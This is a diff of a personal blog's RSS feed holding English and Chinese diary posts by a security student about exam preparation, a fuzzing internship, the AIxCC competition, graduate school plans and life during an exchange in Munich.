-&lt;p&gt;On top of all this, my IELTS score currently stands at only 6. I need to put in the effort to improve it to 6.5 by the end of this year. And, I also have to obtain a GRE score this year! The NUS need GRE grade, cry!&lt;/p&gt;
-&lt;p&gt;Yes, there are just too many tasks on my plate.&lt;/p&gt;
-&lt;p&gt;Despite my initial intention to avoid discussing anything related to computer knowledge formally, I&amp;rsquo;ve found it difficult to do so. First, let me list all the tasks I need to complete:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Course projects
-&lt;ul&gt;
-&lt;li&gt;NLP course&lt;/li&gt;
-&lt;li&gt;CV course&lt;/li&gt;
-&lt;li&gt;AI Reach Practice&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Internship project&lt;/li&gt;
-&lt;li&gt;IELTS&lt;/li&gt;
-&lt;li&gt;GRE&lt;/li&gt;
-&lt;li&gt;AIxCC competition&lt;/li&gt;
-&lt;li&gt;School applications (Personal Statement, Reference Letter, and so on&amp;hellip;)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;However, I want to make it clear that I&amp;rsquo;m not writing this blog to complain. My aim is to tackle these challenges one by one.&lt;/p&gt;
-&lt;h2 id=&#34;some-research-experiences&#34; &gt;Some Research experiences
-&lt;span&gt;
-    &lt;a href=&#34;#some-research-experiences&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;After that, I want to share some research experiences I&amp;rsquo;ve faced in the last few months. Perhaps I should list them for a clearer expression.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;You should divide your tasks into smaller, more manageable ones until you can.&lt;/li&gt;
-&lt;li&gt;Many times, you may think you&amp;rsquo;ve found a paper that could solve your problems, but most of the time, you&amp;rsquo;ll find it couldn&amp;rsquo;t after some experimentation. This is a common occurrence, so keep on reading and trying.&lt;/li&gt;
-&lt;li&gt;Writing a weekly summary, in my internship, it is called a &amp;ldquo;weekly report,&amp;rdquo; can make your project clearer, and perhaps you will get new ideas when you write it.&lt;/li&gt;
-&lt;li&gt;Don&amp;rsquo;t always think you should wait until you are well-prepared to start. When you&amp;rsquo;re confused, what you should do is start. You can do five or more tasks, even if they are not well-prepared, instead of one task for which you&amp;rsquo;ve prepared everything well.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Hope everything goes smoothly afterwards!&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>Blog Intro</title>
-      <link>https://BestRun.github.io/posts/introduction/</link>
-      <pubDate>Tue, 29 Aug 2023 18:37:28 +0800</pubDate>
-      
-      <guid>https://BestRun.github.io/posts/introduction/</guid>
-      <description>&lt;h2 id=&#34;hello-everyone&#34; &gt;Hello, everyone!
-&lt;span&gt;
-    &lt;a href=&#34;#hello-everyone&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;This website is the blog site launched from my secondary GitHub account. Its primary purpose is to migrate Chinese articles after transforming them into English versions. You can visit my original blog at: &lt;a href=&#34;https://b1ue0ceanrun.github.io/&#34;&gt;https://b1ue0ceanrun.github.io/&lt;/a&gt;&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://BestRun.github.io/life/%E7%A0%94%E4%B8%80%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://BestRun.github.io/life/%E7%A0%94%E4%B8%80%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</guid>
-      <description>&lt;p&gt;今天CVPR比赛结果出来了，随便玩了一下竟然拿了第一。虽然虐一把 MMLab 的感觉确实挺爽的，但我大概不会再参加这种比赛了。一方面是时间的原因，另一方面是我更想静下心来深入学习一些更小、更本质的研究方向。&lt;/p&gt;
-&lt;p&gt;不得不承认，我是个挺功利的人。但此刻，我却陷入了迷茫。要是放在一年前，赢比赛肯定会让我很开心。但现在，我却高兴不起来。我真的学到东西了吗？我在进步吗？我掌握的知识足以支撑未来的发展吗？我仿佛陷入了“自证”怪圈。什么才是我真正想做的？是踏实搞科研，还是走捷径水几篇论文？我该静下心来打磨基础，还是急于求成，追求一些看起来亮眼但没有实质意义的“成果”？&lt;/p&gt;
-&lt;p&gt;最近参加的一些比赛，也让我切身体会到了科研圈的浮躁与虚假。有些文章，比如某港大的论文，明明充满问题，但依然能堂而皇之地发表。而我们用一个非常简单的方法，就能“打脸”不少看似高大上的工作。当一个领域充斥着低质量甚至错误的论文，真正想认真做事的人反而会觉得心寒。&lt;/p&gt;
-&lt;p&gt;比如最近 LLM+软件安全 很火，但我觉得决定成败的关键依然是对软件领域的功力是否深厚，而不是LLM玩的有多熟练，比如静态分析、动态分析、程序验证等等，而这些恰恰是我目前还不具备的。&lt;/p&gt;
-&lt;p&gt;除了对科研圈的质疑，我也在反思这个领域本身。Fuzzing 现在是安全领域的热门方向，但如果有一天代码覆盖率无法再提升了，那又该怎么办？当 Fuzzing 发现不了新漏洞时，它的价值又在哪里？毕竟，Fuzzing 并不是从根本上解决安全问题。每天虽然有新代码可以fuzz，但正如一位大哥说的，那更像是“吃了上顿没下顿”。&lt;/p&gt;
-&lt;p&gt;今天和几位博士聊了聊，说到我想继续读安全方向的博士。他们问我：“安全的方向很多，你想做哪一个？”我一时语塞。我一直说自己想做安全，可是我真的知道自己想做的是哪种“安全”吗？这种方向真的有意义吗？我对安全的理解够深吗？曾经我以为能发顶会就是好文章，但出国后我才发现，这种想法未免太天真了。&lt;/p&gt;
-&lt;p&gt;当然，我也可以选择去一个“水组”，发些平庸的论文，混个学位。但那绝对不是我想要的生活。&lt;/p&gt;
-&lt;p&gt;有位大哥说，安全其实有点像是一个“投机取巧”的领域。我一时愣住了，有些迷茫，但好像也隐约明白了些什么。&lt;/p&gt;
-&lt;p&gt;迷茫中前行吧。&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>2026年中的一些思考</title>
-      <link>https://BestRun.github.io/life/2026%E5%B9%B4%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://BestRun.github.io/life/2026%E5%B9%B4%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</guid>
-      <description>&lt;p&gt;随手写一写，好久没写文字了。
-感觉时间过的好快，似乎昨天还在停留在国内过年，马上就快要结束慕尼黑的交换生活了。&lt;/p&gt;
-&lt;p&gt;这段交换生活，其实很精彩。&lt;/p&gt;
-&lt;h2 id=&#34;改变和维持&#34; &gt;改变和维持
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%94%b9%e5%8f%98%e5%92%8c%e7%bb%b4%e6%8c%81&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;要说有什么改变的，可能是自己的身心健康有在恢复。
+在这里呆了俩月，学到了很多业务上的能力，也明白了一些事情：&lt;/li>
+&lt;li>功能上线前不可能总让你完全准备好，先做起来。&lt;/li>
+&lt;li>很多业务是你根本没接触过的，这时候就需要你快速学习的能力。
+实习了两个月，我感觉自己还是更向往学术界一些，工业界可能对我这种不安分的人来说有点boring，加上学校一堆课，就回到了学校。&lt;/li>
+&lt;/ul>
+&lt;h5 id="iscas-intership" >ISCAS Intership
+&lt;span>
+&lt;a href="#iscas-intership">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h5>&lt;p>回到学校，就立刻进入到了找暑期实习的状态。三月到五月面了一堆公司，这里挂一下当时的emo推。
+&lt;img src="https://BestRun.github.io/pictures/20231231162233.png" width="600" height="800">&lt;/p>
+&lt;p>五月份投了ISCAS的系统安全实习生，没想到顺利的通过了之后就开启了直到今天的“科研”实习。&lt;/p>
+&lt;p>可以说，这段实习让我对安全，科研都有了新的认知。&lt;/p>
+&lt;p>七月份到十月份，疯狂的读了很多fuzz相关的论文，感觉打开了新世界（以前甚至肤浅的觉得sec的科研有点花拳绣腿的感觉，不是很实用）。现在发现，学术界才是引领sec发展的最前线。&lt;/p>
+&lt;p>感谢导让我自己负责一个项目，一直坐到今天，也快有了结果。&lt;/p>
+&lt;h4 id="技术" >技术
+&lt;span>
+&lt;a href="#%e6%8a%80%e6%9c%af">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h4>&lt;p>今年技术感觉没啥大的进步，但由于GPT的出现，加上学校里的成，我更深入地去了解了一些NLP的相关知识，也去实践了一些AI和安全相关的东西。最大的进步还是入坑了FUZZ领域吧，还是要继续加油啊，小Hao！&lt;/p>
+&lt;p>此外还被西北大学的xing教授拉去帮忙AIXCC比赛，希望以后有机会去USA读个PHD。&lt;/p>
+&lt;h3 id="生活情感" >生活（情感）
+&lt;span>
+&lt;a href="#%e7%94%9f%e6%b4%bb%e6%83%85%e6%84%9f">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>今年的生活可以说是有滋有味了，从小Hao的qq空间可以看出来。&lt;/p>
+&lt;p>此外，今年最大的突破可以说是开始了健身。自己的身体摆了两年，今年终于开始要健身了，目前已经健身了一个月，自我感觉良好，从刚开始10kg的哑铃都做不动到现在可以挑战17.5kg，进步还是肉眼可见的哈。&lt;/p>
+&lt;p>&lt;strong>情感方面，本人目前单身，欢迎来打扰o.o&lt;/strong>&lt;/p>
+&lt;h3 id="展望规划" >展望&amp;amp;规划
+&lt;span>
+&lt;a href="#%e5%b1%95%e6%9c%9b%e8%a7%84%e5%88%92">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>关于留学：申请ing，没啥好说的&lt;/p>
+&lt;p>我是想读个master当gap year然后考虑下去学术界还是工业界。如果没有合适的奥佛，我就打算做一年科研助理直接去学术界了，毕竟master对读博也没啥大用。&lt;/p>
+&lt;p>前两天和梁兄（一位在USA追梦的PHD）交流了一下，我跟他说，我萌生了Gap Year的想法，他也是很支持。他也赞同，花点时间搞清楚自己想要什么更加重要。&lt;/p>
+&lt;p>之前和西北大学的某位前辈请教，问他关于读博的问题，他告所我说sec的PHD还是更看技术一些吧，gpa不要太低就好，说我可以直接申。但是今年是来不及辣，看明年咯，希望一些顺利！&lt;/p></description></item><item><title>A diary in a special time</title><link>https://BestRun.github.io/life/a-simple-diary/</link><pubDate>Sat, 21 Oct 2023 11:15:13 +0800</pubDate><guid>https://BestRun.github.io/life/a-simple-diary/</guid><description>&lt;h2 id="my-life-and-mental-state" >My life and mental state
+&lt;span>
+&lt;a href="#my-life-and-mental-state">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Today is Saturday, and I don&amp;rsquo;t want to overwhelm myself with work, even though I&amp;rsquo;m facing the most intense pressure I&amp;rsquo;ve ever experienced in my undergraduate years as I strive to secure a Master&amp;rsquo;s or PhD position.&lt;/p>
+&lt;p>Just yesterday, I gave a presentation for one of my courses. The teacher, an associate professor from Canada, transformed the presentation into a meaningful conversation. He offered a piece of advice that has left a lasting impact on me and provided valuable lessons. He emphasized the importance of always being prepared for a presentation and understanding the purpose at any given time. This advice is especially crucial when you&amp;rsquo;re planning to study abroad, as it&amp;rsquo;s easy to feel lost in a new environment. He humorously added, &amp;ldquo;In many years, you might forget my name and the name of the course, but you&amp;rsquo;ll remember being in a strange place, with an strange course and teacher, telling you to always be prepared and know your purpose.&amp;rdquo;&lt;/p>
+&lt;p>His words deeply resonated with me. Lately, I&amp;rsquo;ve been juggling various commitments, such as internships, preparing for the IELTS, and applying for Master&amp;rsquo;s programs. It&amp;rsquo;s been three months since I last wrote a blog or reflected on my life and studies.So today, I took a moment to sit down in my lab and write this blog to summarize the past few months of my work and life.&lt;/p>
+&lt;p>I&amp;rsquo;d like to share what I&amp;rsquo;ve been up to recently. Firstly, I&amp;rsquo;m still engrossed in my internship project focused on fuzzing at ISCAS. What&amp;rsquo;s more, I&amp;rsquo;m about to commence work with Professor Xing on the AIxCC competition, and I&amp;rsquo;m faced with three course projects that I must complete – it feels like quite a workload!&lt;/p>
+&lt;p>Additionally, this week I&amp;rsquo;ve prepared all the application materials for my UK university applications. I&amp;rsquo;m set to apply to the University of Southampton next Monday.&lt;/p>
+&lt;p>Furthermore, I&amp;rsquo;m in the process of deciding the direction for my bachelor&amp;rsquo;s thesis. I can use the progress I made in AIxCC competition as my bachelor&amp;rsquo;s thesis, but my school tutor also give my a direction about detecting encrypted malicious traffic.&lt;/p>
+&lt;p>On top of all this, my IELTS score currently stands at only 6. I need to put in the effort to improve it to 6.5 by the end of this year. And, I also have to obtain a GRE score this year! The NUS need GRE grade, cry!&lt;/p>
+&lt;p>Yes, there are just too many tasks on my plate.&lt;/p>
+&lt;p>Despite my initial intention to avoid discussing anything related to computer knowledge formally, I&amp;rsquo;ve found it difficult to do so. First, let me list all the tasks I need to complete:&lt;/p>
+&lt;ul>
+&lt;li>Course projects
+&lt;ul>
+&lt;li>NLP course&lt;/li>
+&lt;li>CV course&lt;/li>
+&lt;li>AI Reach Practice&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Internship project&lt;/li>
+&lt;li>IELTS&lt;/li>
+&lt;li>GRE&lt;/li>
+&lt;li>AIxCC competition&lt;/li>
+&lt;li>School applications (Personal Statement, Reference Letter, and so on&amp;hellip;)&lt;/li>
+&lt;/ul>
+&lt;p>However, I want to make it clear that I&amp;rsquo;m not writing this blog to complain. My aim is to tackle these challenges one by one.&lt;/p>
+&lt;h2 id="some-research-experiences" >Some Research experiences
+&lt;span>
+&lt;a href="#some-research-experiences">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>After that, I want to share some research experiences I&amp;rsquo;ve faced in the last few months. Perhaps I should list them for a clearer expression.&lt;/p>
+&lt;ol>
+&lt;li>You should divide your tasks into smaller, more manageable ones until you can.&lt;/li>
+&lt;li>Many times, you may think you&amp;rsquo;ve found a paper that could solve your problems, but most of the time, you&amp;rsquo;ll find it couldn&amp;rsquo;t after some experimentation. This is a common occurrence, so keep on reading and trying.&lt;/li>
+&lt;li>Writing a weekly summary, in my internship, it is called a &amp;ldquo;weekly report,&amp;rdquo; can make your project clearer, and perhaps you will get new ideas when you write it.&lt;/li>
+&lt;li>Don&amp;rsquo;t always think you should wait until you are well-prepared to start. When you&amp;rsquo;re confused, what you should do is start. You can do five or more tasks, even if they are not well-prepared, instead of one task for which you&amp;rsquo;ve prepared everything well.&lt;/li>
+&lt;/ol>
+&lt;p>Hope everything goes smoothly afterwards!&lt;/p></description></item><item><title>Blog Intro</title><link>https://BestRun.github.io/posts/introduction/</link><pubDate>Tue, 29 Aug 2023 18:37:28 +0800</pubDate><guid>https://BestRun.github.io/posts/introduction/</guid><description>&lt;h2 id="hello-everyone" >Hello, everyone!
+&lt;span>
+&lt;a href="#hello-everyone">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>This website is the blog site launched from my secondary GitHub account. Its primary purpose is to migrate Chinese articles after transforming them into English versions. You can visit my original blog at: &lt;a href="https://b1ue0ceanrun.github.io/">https://b1ue0ceanrun.github.io/&lt;/a>&lt;/p></description></item><item><title/><link>https://BestRun.github.io/life/%E7%A0%94%E4%B8%80%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://BestRun.github.io/life/%E7%A0%94%E4%B8%80%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</guid><description>&lt;p>今天CVPR比赛结果出来了，随便玩了一下竟然拿了第一。虽然虐一把 MMLab 的感觉确实挺爽的，但我大概不会再参加这种比赛了。一方面是时间的原因，另一方面是我更想静下心来深入学习一些更小、更本质的研究方向。&lt;/p>
+&lt;p>不得不承认，我是个挺功利的人。但此刻，我却陷入了迷茫。要是放在一年前，赢比赛肯定会让我很开心。但现在，我却高兴不起来。我真的学到东西了吗？我在进步吗？我掌握的知识足以支撑未来的发展吗？我仿佛陷入了“自证”怪圈。什么才是我真正想做的？是踏实搞科研，还是走捷径水几篇论文？我该静下心来打磨基础，还是急于求成，追求一些看起来亮眼但没有实质意义的“成果”？&lt;/p>
+&lt;p>最近参加的一些比赛，也让我切身体会到了科研圈的浮躁与虚假。有些文章，比如某港大的论文，明明充满问题，但依然能堂而皇之地发表。而我们用一个非常简单的方法，就能“打脸”不少看似高大上的工作。当一个领域充斥着低质量甚至错误的论文，真正想认真做事的人反而会觉得心寒。&lt;/p>
+&lt;p>比如最近 LLM+软件安全 很火，但我觉得决定成败的关键依然是对软件领域的功力是否深厚，而不是LLM玩的有多熟练，比如静态分析、动态分析、程序验证等等，而这些恰恰是我目前还不具备的。&lt;/p>
+&lt;p>除了对科研圈的质疑，我也在反思这个领域本身。Fuzzing 现在是安全领域的热门方向，但如果有一天代码覆盖率无法再提升了，那又该怎么办？当 Fuzzing 发现不了新漏洞时，它的价值又在哪里？毕竟，Fuzzing 并不是从根本上解决安全问题。每天虽然有新代码可以fuzz，但正如一位大哥说的，那更像是“吃了上顿没下顿”。&lt;/p>
+&lt;p>今天和几位博士聊了聊，说到我想继续读安全方向的博士。他们问我：“安全的方向很多，你想做哪一个？”我一时语塞。我一直说自己想做安全，可是我真的知道自己想做的是哪种“安全”吗？这种方向真的有意义吗？我对安全的理解够深吗？曾经我以为能发顶会就是好文章，但出国后我才发现，这种想法未免太天真了。&lt;/p>
+&lt;p>当然，我也可以选择去一个“水组”，发些平庸的论文，混个学位。但那绝对不是我想要的生活。&lt;/p>
+&lt;p>有位大哥说，安全其实有点像是一个“投机取巧”的领域。我一时愣住了，有些迷茫，但好像也隐约明白了些什么。&lt;/p>
+&lt;p>迷茫中前行吧。&lt;/p></description></item><item><title/><link>https://BestRun.github.io/life/%E8%87%AA%E6%88%91%E5%AE%A1%E8%A7%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://BestRun.github.io/life/%E8%87%AA%E6%88%91%E5%AE%A1%E8%A7%86/</guid><description>&lt;p>回答一些问题：&lt;/p>
+&lt;ol>
+&lt;li>我适合读博吗？&lt;/li>
+&lt;li>我适合在哪读博？&lt;/li>
+&lt;li>我的价值是什么&lt;/li>
+&lt;li>我的能力在硕士阶段有所提升吗&lt;/li>
+&lt;li>我怎么证明我的优秀&lt;/li>
+&lt;li>我之后到底想走一条什么样的路&lt;/li>
+&lt;li>我想要过什么样的生活&lt;/li>
+&lt;li>工业界要想要的能力和学术界想要的能力&lt;/li>
+&lt;li>走学术界想要研究的方向&lt;/li>
+&lt;li>走工业界想要工作的内容&lt;/li>
+&lt;/ol>
+&lt;p>我适合读博吗？&lt;/p>
+&lt;p>我适合在哪读博？&lt;/p>
+&lt;p>我这么证明我的优秀：
+我希望得到我尊重的人的认可&lt;/p>
+&lt;p>我之后想走一条什么样的路：
+xxx&lt;/p>
+&lt;p>我的能力在硕士阶段有所提升吗？ 如果有具体体现在哪些方面&lt;/p>
+&lt;p>工业界想做的： LLM, agent, Model 模型公司
+学术界：纯 security? 也不是不行 LLM + security. New attack surface&lt;/p></description></item><item><title>2026年中的一些思考</title><link>https://BestRun.github.io/life/2026%E5%B9%B4%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://BestRun.github.io/life/2026%E5%B9%B4%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</guid><description>&lt;p>随手写一写，好久没写文字了。
+感觉时间过的好快，似乎昨天还在停留在国内过年，马上就快要结束慕尼黑的交换生活了。&lt;/p>
+&lt;p>这段交换生活，其实很精彩。&lt;/p>
+&lt;h2 id="改变和维持" >改变和维持
+&lt;span>
+&lt;a href="#%e6%94%b9%e5%8f%98%e5%92%8c%e7%bb%b4%e6%8c%81">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>要说有什么改变的，可能是自己的身心健康有在恢复。
 每到周末，我都在阿尔卑斯的山里。
 坐上火车，有时在去往主火的火车上还在想目的地。
-之后，放空自己，开始徒步。&lt;/p&gt;
-&lt;p&gt;没有了自己的 studio，转而住到了一个house里，有了很多很好的室友，我们一起烧烤，玩牌，生活中似乎也有了一些意想不到的惊喜。&lt;/p&gt;
-&lt;p&gt;维持的，便是繁忙的状态。上学期被学校的 project 压的喘不过气来，这学期又开始了新的合作。
-有时候就在想，如果把追求放低一些，自己是不是会更快乐一些。&lt;/p&gt;
-&lt;h2 id=&#34;消极和积极&#34; &gt;消极和积极
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%b6%88%e6%9e%81%e5%92%8c%e7%a7%af%e6%9e%81&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;什么是消极，什么是积极？
+之后，放空自己，开始徒步。&lt;/p>
+&lt;p>没有了自己的 studio，转而住到了一个house里，有了很多很好的室友，我们一起烧烤，玩牌，生活中似乎也有了一些意想不到的惊喜。&lt;/p>
+&lt;p>维持的，便是繁忙的状态。上学期被学校的 project 压的喘不过气来，这学期又开始了新的合作。
+有时候就在想，如果把追求放低一些，自己是不是会更快乐一些。&lt;/p>
+&lt;h2 id="消极和积极" >消极和积极
+&lt;span>
+&lt;a href="#%e6%b6%88%e6%9e%81%e5%92%8c%e7%a7%af%e6%9e%81">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>什么是消极，什么是积极？
 我自以为是一个拥有积极心态的人。
 感觉在这个微妙的年纪，却很容易迷失。
 有时候甚至会觉得，活着也就这样。
 没有什么能让我提起兴趣的事。
 说是要为自己而活，但感觉终究要活在社会和他人的期待下，感觉很无奈。
-一想到这，就很难积极起来了。&lt;/p&gt;
-&lt;h2 id=&#34;专注和分心&#34; &gt;专注和分心
-&lt;span&gt;
-    &lt;a href=&#34;#%e4%b8%93%e6%b3%a8%e5%92%8c%e5%88%86%e5%bf%83&#34;&gt;
